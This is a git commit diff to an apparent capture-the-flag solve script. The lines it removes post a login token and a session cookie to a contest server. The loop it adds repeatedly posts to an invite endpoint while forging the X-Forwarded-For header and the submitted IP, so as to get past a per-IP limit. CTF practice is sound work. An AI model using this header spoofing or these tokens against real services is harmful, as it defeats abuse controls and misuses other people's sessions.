abff0639ff109d7e7b2a5f839ea67257a8b3428f
EricJeffrey <1719937412@qq.com>
2021-10-25 11:36:58 +0800

    2 more

--- 8_flag/test.js
+++ 8_flag/test.js
@@ -1,24 +1,17 @@
-fetch("http://202.38.93.111:10888/api/login", {
-  "headers": {
-    "content-type": "application/x-www-form-urlencoded",
-  },
-  "body": "token=199%3AMEYCIQDNRjHc7%2B34dlBw%2BSAs6t%2FJPDt%2FV0f%2BBOAhI6%2FJXFEN2QIhAIqv9QEHzbE1uIET%2FQUxHvPPiqc4uMErzbFc91k43ZC5",
-  "method": "POST",
-});
-
-fetch("http://202.38.93.111:10888/invite/2752f459-630e-41f4-815b-d1717cd3d2ad", {
-  "headers": {
-    "content-type": "application/x-www-form-urlencoded",
-  },
-  "body": "ip=0.0.0.0",
-  "method": "POST",
-});
-/*
-curl 'http://202.38.93.111:10888/invite/e2b1c91c-6f4d-429c-826d-58aa8c2b8ae6' \
-  -H 'Content-Type: application/x-www-form-urlencoded' \
-  -H 'Cookie: PHPSESSID=564b74ea9d0df00c10914666367c9d38; session=eyJ0b2tlbiI6IjE5OTpNRVlDSVFETlJqSGM3KzM0ZGxCdytTQXM2dC9KUER0L1YwZitCT0FoSTYvSlhGRU4yUUloQUlxdjlRRUh6YkUxdUlFVC9RVXhIdlBQaXFjNHVNRXJ6YkZjOTFrNDNaQzUifQ.YXTXAw.jQAB1MFVcGrjssbUEv6Ztj9G3g0' \
-  --data-raw 'ip=211.86.152.15' 
-
-*/
 
 // dirmap?
+
+// bing: CTF ip 
+
+i = 10;
+setInterval(() => {
+  fetch("http://202.38.93.111:10888/invite/1c73a41f-7052-4d29-9710-211e5cd53481", {
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded",
+      "X-Forwarded-For": i + ".0.0.0"
+    },
+    "body": "ip=" + i + ".0.0.0",
+    "method": "POST",
+  });
+  i += 1;
+}, Math.random() * 200 + 1000);
